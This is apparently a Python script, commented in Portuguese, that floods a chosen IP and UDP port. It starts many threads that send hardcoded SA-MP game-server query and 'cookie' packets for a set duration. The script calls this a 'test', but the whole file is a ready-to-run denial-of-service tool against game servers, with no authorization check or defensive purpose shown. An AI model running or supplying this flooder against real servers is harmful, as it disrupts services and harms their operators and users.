import socket
import threading
import random
import time
import sys

# Configurações padrão (modifique conforme necessário)
DEFAULT_THREADS = 100  # Número padrão de threads
DEFAULT_DURATION = 60  # Duração do teste em segundos
DEFAULT_DELAY = 0.1    # Intervalo entre pacotes em segundos

# Lista de pacotes (hexadecimais) para enviar
PACKETS = [
    bytes.fromhex("53414d5090d91d4d611e700a465b00"),  # Exemplo de pacote "p"
    bytes.fromhex("53414d509538e1a9611e63"),          # Exemplo de pacote "c"
    bytes.fromhex("53414d509538e1a9611e69"),          # Exemplo de pacote "i"
    bytes.fromhex("53414d509538e1a9611e72"),          # Exemplo de pacote "r"
    bytes.fromhex("081e62da"),                        # Cookie port 7796
    bytes.fromhex("081e77da"),                        # Cookie port 7777
    bytes.fromhex("081e4dda"),                        # Cookie port 7771
    bytes.fromhex("021efd40"),                        # Cookie port 7784
    bytes.fromhex("021efd40"),                        # Cookie port 1111
    bytes.fromhex("081e7eda")                         # Cookie port 1111 também
]

# Função para enviar pacotes em uma thread
def send_packets(ip, port, duration, delay):
    start_time = time.time()
    sent = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() - start_time < duration:
        try:
            # Seleciona um pacote aleatório para enviar
            packet = random.choice(PACKETS)
            sock.sendto(packet, (ip, port))
            sent += 1
            time.sleep(delay)
        except Exception as e:
            print(f"[ERRO] Falha ao enviar pacote: {e}")
            break

    print(f"[INFO] Thread finalizada: {sent} pacotes enviados.")

# Função principal
def main():
    if len(sys.argv) < 3:
        print("Uso: python script.py <IP> <PORTA> [THREADS] [DURAÇÃO] [ATRASO]")
        sys.exit()

    # Coleta os argumentos da linha de comando
    ip = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_THREADS
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else DEFAULT_DURATION
    delay = float(sys.argv[5]) if len(sys.argv) > 5 else DEFAULT_DELAY

    print(f"[INFO] Teste iniciado no IP: {ip}, Porta: {port}")
    print(f"[INFO] Threads: {threads}, Duração: {duration}s, Atraso: {delay}s")

    thread_list = []

    try:
        for _ in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, port, duration, delay))
            t.start()
            thread_list.append(t)
            time.sleep(0.05)  # Pequeno intervalo ao iniciar as threads

        for t in thread_list:
            t.join()

    except KeyboardInterrupt:
        print("\n[INFO] Teste interrompido manualmente.")
    finally:
        print("[INFO] Teste finalizado.")

if __name__ == "__main__":
    main()
